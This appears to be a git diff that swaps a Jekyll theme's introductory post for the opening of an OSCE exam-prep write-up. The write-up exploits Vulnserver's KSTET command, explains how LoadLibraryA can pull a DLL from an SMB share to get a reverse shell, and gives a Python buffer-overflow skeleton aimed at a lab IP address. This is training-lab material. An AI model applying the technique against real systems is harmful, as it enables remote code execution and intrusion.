@@ -1,87 +1,53 @@
 ---
 layout: post
-title: Introducing Reverie - A ridiculously elegant Jekyll theme
-categories: [Miscellaneous, Jekyll]
+title: OSCE Prep - Vulnserver KSTET Using Win32 API 
+categories: [OSCE]
 ---
 
-[Reverie](https://github.com/amitmerchant1990/reverie) is a [Jekyll](https://jekyllrb.com/)-powered theme which is simple and opinionated. It's actually a fork of [jekyll-now](https://github.com/barryclark/jekyll-now) with some additional features and personal touches which I've implemented to suit my needs for my blog.
+While preparing for my upcoming OSCE exam I have spent many hours exploiting Vulnserver's various vulnerable functions in different ways. In this post, I wanted to highlight a technique I first came across on a Hack The Box write-up of the BigHead vulnerable machine by mislusnys, which can be found [here](http://mislusnys.github.io/post/htb-bighead/). All credit for this technique goes to them, I am merely using it to exploit a similarly small buffer space without making use of an egghunter or re-using sockets.
 
-This is a plug-and-play Jekyll theme which you can use on GitHub Pages without even setting up a local environment.
 
-![](/images/reverie-demo.png)
 
-## Features overview
+### Win32 API One-liners
 
-- Command-line free fork-first workflow, using GitHub.com to create, customize and post to your blog
-- Fully responsive and mobile optimized base theme
-- Sass/Coffeescript support using Jekyll 2.0
-- Free hosting on your GitHub Pages user site
-- All the SEO goodies comes in-built
-- Markdown blogging
-- Syntax highlighting using Pygments
-    - [Dracula syntax theme](https://draculatheme.com/) included
-- Disqus commenting
-- Google Analytics integration
-- Fuzzy search across blog posts
-- Pagination of posts works out-of-the-box.
-- Categorize posts out-of-the box
-- RSS Feed
-- In-built sitemap
+The Win32 API contains various ways of executing commands on the operating system. The most well known ones are `WinExec()`, `System()` and `ShellExecute()`. Each of these can be passed a command to be run directly on the system as if you entered it on the commandline. For a good write-up on `WinExec()` shellcode, I recommend FuzzySecurity's [Writing W32 shellcode](https://www.fuzzysecurity.com/tutorials/expDev/6.html) guide which is part of his excellent exploit development series.
 
-<div style="text-align: center;">
- <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CE7D6KJY&placement=wwwamitmerchantcom" id="_carbonads_js"></script>
-</div>
+A lesser known but equally effective Win32 API one-liner to execute code is the `LoadLibraryA()` function which is also exported by kernel32.dll. 
 
-## Using Reverie on GitHub Pages
+### Shhh, is LoadLibrary!
 
-### Step 1) Fork Reverie to your User Repository
-
-Fork [this repository](https://github.com/amitmerchant1990/reverie), then rename the repository to `yourgithubusername.github.io`.
-
-Alternatively, you can use [Use this template](https://github.com/amitmerchant1990/reverie/generate) button if you want to create a repository with a clean commit history which will use Reverie as a template.
-
-Your Jekyll blog will often be viewable immediately at <https://yourgithubusername.github.io> (if it's not, you can often force it to build by completing step 2)
-
-### Step 2) Customize and view your site
-
-Enter your site name, description, avatar and many other options by editing the `_config.yml` file. You can easily turn on Google Analytics tracking, Disqus commenting and social icons here.
-
-Making a change to `_config.yml` (or any file in your repository) will force GitHub Pages to rebuild your site with jekyll. Your rebuilt site will be viewable a few seconds later at <https://yourgithubusername.github.io> - if not, give it ten minutes as GitHub suggests and it'll appear soon.
-
-### Step 3) Publish your first blog post
-
-Create a new file called `/_posts/2019-2-13-Hello-World.md` to publish your first blog post. That's all you need to do to publish your first blog post! This [Markdown Cheatsheet](https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet) might come in handy while writing the posts.
-
-> You can add additional posts in the browser on GitHub.com too! Just hit the <kbd>Create new file</kbd> button in `/_posts/` to create new content. Just make sure to include the [front-matter](http://jekyllrb.com/docs/frontmatter/) block at the top of each new blog post and make sure the post's filename is in this format: year-month-day-title.md
-
-## Using Categories in Reverie
-
-You can categorize your content based on `categories` in Reverie. For this, you just need to add `categories` in front matter like below:
-
-For adding single category:
-
-```md
-categories: JavaScript
+The LoadLibraryA function is used to load a module into the address space of the calling process. According to the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya), it only takes one argument:
+```c++
+HMODULE LoadLibraryA(
+  LPCSTR lpLibFileName
+);
 ```
 
-For adding multiple categories:
+Luckily, the lpLibFileName can be any resolvable path in Windows - including network paths. This effectively allows us to call any DLL on a SMB share and have it loaded by the application. It's then pretty straightforward to craft a DLL of our choosing using msfvenom and capture the reverse shell. Since it only takes one argument, the amount of shellcode required to execute this is quite small, which can be very handy when we're working with limited buffer space. Let's see this in action in the Vulnserver KSTET command. 
 
-```md
-categories: [PHP, Laravel]
+
+### KSTET
+
+I'll skip the fuzzing of the KSTET function in vulnserver as there's plenty of write-ups on this subject already. For the purpose of this post we'll assume we know the offsets for EIP and will use the following skeleton exploit to start:
+```python
+
+#!/usr/bin/python
+
+import sys
+import socket
+
+buf = "KSTET "
+buf += "A"*70
+buf += "BBBB"
+buf += "C"*(1000-len(buf))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.12",9999))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
 ```
 
-The contegorized content can be shown over this URL: <https://yourgithubusername.github.io/categories/>
-
-## RSS
-
-The generated [RSS feed](https://en.wikipedia.org/wiki/RSS) of your blog can be found at <https://yourgithubusername.github.io/feed>. You can see the example RSS feed over [here](https://www.amitmerchant.com/reverie/feed).
-
-## Sitemap
-
-The generated sitemap of your blog can be found at <https://yourgithubusername.github.io/sitemap>. You can see the example sitemap feed over [here](https://www.amitmerchant.com/reverie/sitemap).
-
-## License
-
-MIT
 
 
